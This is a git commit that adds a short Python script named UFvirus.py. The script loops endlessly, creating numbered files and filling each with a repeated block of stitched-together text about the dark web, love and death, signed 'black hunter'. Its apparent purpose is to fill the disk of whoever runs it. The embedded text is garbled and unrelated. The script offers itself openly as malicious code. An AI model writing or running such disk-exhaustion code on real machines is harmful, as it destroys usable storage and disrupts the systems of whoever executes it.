448e505753584a0880a8bb2ebf6ea3be6cebc474
ChamiduHar <chamiduharshana972@gmail.com>
2025-09-01 08:17:28 +0530

    Initial commit

---
+++ UFvirus.py
@@ -0,0 +1,10 @@
+a=0
+while (True):
+    r=0
+    b=str(a)
+    x=open(b,"a")
+    while(r<=100):
+        x.write("hello,iam black hunter /// The dark web is any form of network or content that requires special software to access. This type of network is specifically created and managed to ensure the anonymity of the user. This is often confused with the term Deep web, which describes any website that cannot be directly accessed by a normal web browser.No, not even close. ``Love'', an emotion in animal brains, have only existed for less than a billion years, yet the unvierse has existed for 13.72 billion years. So obviously, ``love'' cannot be required for existence.Apr 16, 2017Death is the end of life; the irreversible cessation of all biological functions that sustain a living organism.,  ")
+        r=r+1
+    a=a+1
+    
